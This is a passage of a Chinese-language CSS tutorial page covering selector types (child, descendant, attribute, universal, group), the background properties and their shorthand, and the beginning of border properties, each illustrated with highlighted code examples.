*/</span></span><br><span class="line"><span class="selector-class">.btn</span><span class="selector-class">.large</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-子选择器"><a href="#4-4-子选择器" class="headerlink" title="4.4 子选择器"></a>4.4 子选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择作为特定父元素直接子元素的元素</li>
<li>语法：<code>父元素 &gt; 子元素 { 属性: 值; }</code></li>
<li>与后代选择器不同，仅选择直接子元素</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择div的直接子元素p（不包括嵌套的p） */</span></span><br><span class="line"><span class="selector-tag">div</span> &gt; <span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择导航栏中直接的li元素（不包括嵌套的ul中的li） */</span></span><br><span class="line"><span class="selector-class">.navbar</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择表格中直接的tr元素 */</span></span><br><span class="line"><span class="selector-tag">table</span> &gt; <span class="selector-tag">tr</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-5-后代选择器"><a href="#4-5-后代选择器" class="headerlink" title="4.5 后代选择器"></a>4.5 后代选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择作为特定祖先元素后代的所有元素（无论嵌套多深）</li>
<li>语法：<code>祖先元素 后代元素 { 属性: 值; }</code></li>
<li>与子选择器不同，会匹配所有层级的后代</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择div内所有p元素，无论嵌套多深 */</span></span><br><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择导航栏内所有a元素 */</span></span><br><span class="line"><span class="selector-class">.navbar</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择文章内所有列表项 */</span></span><br><span class="line"><span class="selector-class">.article</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-6-属性选择器"><a href="#4-6-属性选择器" class="headerlink" title="4.6 属性选择器"></a>4.6 属性选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择具有特定属性或属性值的元素</li>
<li>语法：<code>元素[属性]</code> 或 <code>元素[属性=&quot;值&quot;]</code></li>
<li>多种匹配方式：包含、开头、结尾等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有具有title属性的a元素 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[title]</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> dashed <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有href属性以&quot;https&quot;开头的a元素 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href^=<span class="string">&quot;https&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有href属性包含&quot;example.com&quot;的a元素 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href*=<span class="string">&quot;example.com&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有href属性以&quot;.pdf&quot;结尾的a元素 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href$=<span class="string">&quot;.pdf&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;pdf-icon.png&quot;</span>) no-repeat left center;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有class属性包含&quot;btn&quot;的元素 */</span></span><br><span class="line"><span class="selector-attr">[class*=<span class="string">&quot;btn&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-7-通配符选择器"><a href="#4-7-通配符选择器" class="headerlink" title="4.7 通配符选择器"></a>4.7 通配符选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择文档中的所有元素</li>
<li>语法：<code>* { 属性: 值; }</code></li>
<li>通常用于全局重置样式</li>
<li>优先级最低</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 全局重置 */</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为所有元素添加过渡效果 */</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-8-群组选择器"><a href="#4-8-群组选择器" class="headerlink" title="4.8 群组选择器"></a>4.8 群组选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>将多个选择器组合在一起，应用相同的样式</li>
<li>语法：<code>选择器1, 选择器2, 选择器3 { 属性: 值; }</code></li>
<li>减少代码重复</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 为所有标题设置相同字体 */</span></span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为所有表单元素设置相同边框 */</span></span><br><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">select</span>, <span class="selector-tag">textarea</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为所有按钮和链接设置悬停效果 */</span></span><br><span class="line"><span class="selector-class">.btn</span>, <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.2s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">:hover</span>, <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-背景"><a href="#5-背景" class="headerlink" title="5. 背景"></a>5. 背景</h2><h3 id="5-1-背景属性详解"><a href="#5-1-背景属性详解" class="headerlink" title="5.1 背景属性详解"></a>5.1 背景属性详解</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color"></a>background-color</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置元素的背景颜色</li>
<li>可以使用颜色名称、十六进制值、RGB值、RGBA值等</li>
<li>透明背景：<code>transparent</code> 或 <code>rgba(0,0,0,0)</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 使用颜色名称 */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用十六进制值 */</span></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#333333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用RGB值 */</span></span><br><span class="line"><span class="selector-class">.banner</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用RGBA值（带透明度） */</span></span><br><span class="line"><span class="selector-class">.modal</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-position"><a href="#background-position" class="headerlink" title="background-position"></a>background-position</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景图像的位置</li>
<li>可以使用关键字（如<code>top</code>、<code>center</code>、<code>bottom</code>、<code>left</code>、<code>right</code>）</li>
<li>也可以使用百分比或像素值</li>
<li>语法：<code>background-position: [水平位置] [垂直位置];</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 使用关键字 */</span></span><br><span class="line"><span class="selector-class">.bg1</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;pattern.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-position</span>: top left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用百分比 */</span></span><br><span class="line"><span class="selector-class">.bg2</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;logo.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>; <span class="comment">/* 水平和垂直都居中 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用像素值 */</span></span><br><span class="line"><span class="selector-class">.bg3</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;icon.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">10px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 混合使用 */</span></span><br><span class="line"><span class="selector-class">.bg4</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;watermark.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-position</span>: right <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-size"><a href="#background-size" class="headerlink" title="background-size"></a>background-size</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景图像的尺寸</li>
<li>常用值：<ul>
<li><code>auto</code>：默认值，保持原始尺寸</li>
<li><code>cover</code>：等比缩放图像，使图像完全覆盖背景区域</li>
<li><code>contain</code>：等比缩放图像，使图像完整显示在背景区域</li>
<li>具体尺寸：如<code>100px 200px</code>，或<code>50% 100%</code></li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 保持原始尺寸 */</span></span><br><span class="line"><span class="selector-class">.original</span> &#123;</span><br><span class="line">    <span class="attribute">background-size</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完全覆盖背景区域 */</span></span><br><span class="line"><span class="selector-class">.cover</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完整显示在背景区域 */</span></span><br><span class="line"><span class="selector-class">.contain</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: contain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 具体尺寸 */</span></span><br><span class="line"><span class="selector-class">.sized</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;icon.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">50px</span> <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 百分比尺寸 */</span></span><br><span class="line"><span class="selector-class">.percent</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;pattern.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-repeat"><a href="#background-repeat" class="headerlink" title="background-repeat"></a>background-repeat</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景图像如何重复</li>
<li>常用值：<ul>
<li><code>repeat</code>：默认值，水平和垂直方向都重复</li>
<li><code>repeat-x</code>：仅水平方向重复</li>
<li><code>repeat-y</code>：仅垂直方向重复</li>
<li><code>no-repeat</code>：不重复</li>
<li><code>space</code>：均匀分布，不裁剪图像</li>
<li><code>round</code>：缩放图像以适应区域</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 默认：水平和垂直重复 */</span></span><br><span class="line"><span class="selector-class">.repeat</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;pattern.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: repeat;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 仅水平重复 */</span></span><br><span class="line"><span class="selector-class">.repeat-x</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;border-top.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: repeat-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 仅垂直重复 */</span></span><br><span class="line"><span class="selector-class">.repeat-y</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;border-left.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: repeat-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不重复 */</span></span><br><span class="line"><span class="selector-class">.no-repeat</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;logo.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 均匀分布 */</span></span><br><span class="line"><span class="selector-class">.space</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;icon.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: space;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 缩放以适应 */</span></span><br><span class="line"><span class="selector-class">.round</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;icon.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: round;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-origin"><a href="#background-origin" class="headerlink" title="background-origin"></a>background-origin</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景图像的定位区域</li>
<li>常用值：<ul>
<li><code>border-box</code>：背景从边框区域开始</li>
<li><code>padding-box</code>：背景从内边距区域开始（默认）</li>
<li><code>content-box</code>：背景从内容区域开始</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 背景从边框区域开始 */</span></span><br><span class="line"><span class="selector-class">.origin-border</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-origin</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景从内边距区域开始（默认） */</span></span><br><span class="line"><span class="selector-class">.origin-padding</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-origin</span>: padding-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景从内容区域开始 */</span></span><br><span class="line"><span class="selector-class">.origin-content</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-origin</span>: content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-clip"><a href="#background-clip" class="headerlink" title="background-clip"></a>background-clip</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景的绘制区域</li>
<li>常用值：<ul>
<li><code>border-box</code>：背景延伸至边框外沿（默认）</li>
<li><code>padding-box</code>：背景延伸至内边距外沿</li>
<li><code>content-box</code>：背景仅在内容区域显示</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 背景延伸至边框外沿（默认） */</span></span><br><span class="line"><span class="selector-class">.clip-border</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#cc0000</span>);</span><br><span class="line">    <span class="attribute">background-clip</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景延伸至内边距外沿 */</span></span><br><span class="line"><span class="selector-class">.clip-padding</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#cc0000</span>);</span><br><span class="line">    <span class="attribute">background-clip</span>: padding-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景仅在内容区域显示 */</span></span><br><span class="line"><span class="selector-class">.clip-content</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#cc0000</span>);</span><br><span class="line">    <span class="attribute">background-clip</span>: content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-attachment"><a href="#background-attachment" class="headerlink" title="background-attachment"></a>background-attachment</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置背景图像是否固定或随内容滚动</li>
<li>常用值：<ul>
<li><code>scroll</code>：默认值，背景随内容滚动</li>
<li><code>fixed</code>：背景固定，不随内容滚动</li>
<li><code>local</code>：背景随元素内容滚动</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 背景随内容滚动（默认） */</span></span><br><span class="line"><span class="selector-class">.attachment-scroll</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">    <span class="attribute">background-attachment</span>: scroll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景固定，不随内容滚动 */</span></span><br><span class="line"><span class="selector-class">.attachment-fixed</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>; <span class="comment">/* 通常与视口高度一起使用 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 背景随元素内容滚动 */</span></span><br><span class="line"><span class="selector-class">.attachment-local</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: auto;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">    <span class="attribute">background-attachment</span>: local;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="background-image"><a href="#background-image" class="headerlink" title="background-image"></a>background-image</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置元素的背景图像</li>
<li>可以使用URL指定图像路径</li>
<li>可以设置多个背景图像（逗号分隔）</li>
<li>可以使用渐变作为背景</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 单个背景图像 */</span></span><br><span class="line"><span class="selector-class">.single-bg</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多个背景图像 */</span></span><br><span class="line"><span class="selector-class">.multiple-bg</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;pattern.png&quot;</span>), <span class="built_in">url</span>(<span class="string">&quot;overlay.png&quot;</span>);</span><br><span class="line">    <span class="attribute">background-position</span>: top left, bottom right;</span><br><span class="line">    <span class="attribute">background-repeat</span>: repeat, no-repeat;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 线性渐变背景 */</span></span><br><span class="line"><span class="selector-class">.linear-gradient</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#cc0000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 径向渐变背景 */</span></span><br><span class="line"><span class="selector-class">.radial-gradient</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(circle, <span class="number">#0066cc</span>, <span class="number">#cc0000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-2-背景简写"><a href="#5-2-背景简写" class="headerlink" title="5.2 背景简写"></a>5.2 背景简写</h3><p><strong>详细解释：</strong></p>
<ul>
<li>使用<code>background</code>属性可以一次性设置多个背景属性</li>
<li>顺序不严格，但建议按标准顺序书写</li>
<li>标准顺序：<code>background: [color] [image] [repeat] [attachment] [position]/[size];</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 基本简写 */</span></span><br><span class="line"><span class="selector-class">.simple</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f0f0f0</span> <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat fixed center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完整简写 */</span></span><br><span class="line"><span class="selector-class">.full</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f0f0f0</span> <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat fixed center center / cover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多个背景的简写 */</span></span><br><span class="line"><span class="selector-class">.multiple</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: </span><br><span class="line">        <span class="built_in">url</span>(<span class="string">&quot;pattern.png&quot;</span>) repeat,</span><br><span class="line">        <span class="built_in">url</span>(<span class="string">&quot;overlay.png&quot;</span>) no-repeat <span class="number">100%</span> <span class="number">100%</span>,</span><br><span class="line">        <span class="built_in">linear-gradient</span>(to bottom, <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.5</span>), <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0</span>)) fixed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 只设置颜色 */</span></span><br><span class="line"><span class="selector-class">.color-only</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 只设置图像 */</span></span><br><span class="line"><span class="selector-class">.image-only</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-边框"><a href="#6-边框" class="headerlink" title="6. 边框"></a>6. 边框</h2><h3 id="6-1-边框属性详解"><a href="#6-1-边框属性详解" class="headerlink" title="6.1 边框属性详解"></a>6.1 边框属性详解</h3><h4 id="border-color"><a href="#border-color" class="headerlink" title="border-color"></a>border-color</h4><p><strong>详细解释：</strong></p>
<ul>
<li>设置边框的颜色</li>
<li>可以为四条边设置不同颜色</li>
<li>语法：<code>border-color: [上] [右] [下] [左];</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有边框相同颜色 */</span></span><br><span class="line"><span class="selector-class">.all-same</span> &#123;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上下相同，左右相同 */</span></span><br><span class="line"><span class="selector-class">.top-bottom</span> &#123;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#0066cc</span> <span class="number">#cc0000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四条边各不相同 */</span></span><br><span class="line"><span class="selector-class">.four-different</span> &#123;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#0066cc</span> <span class="number">#cc0000</span> <span class="number">#00cc66</span> <span class="number">#6600cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分别设置每条边 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">border-top-color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="attribute">border-right-color</span>: <span class="number">#cc0000</span>;</span><br><span 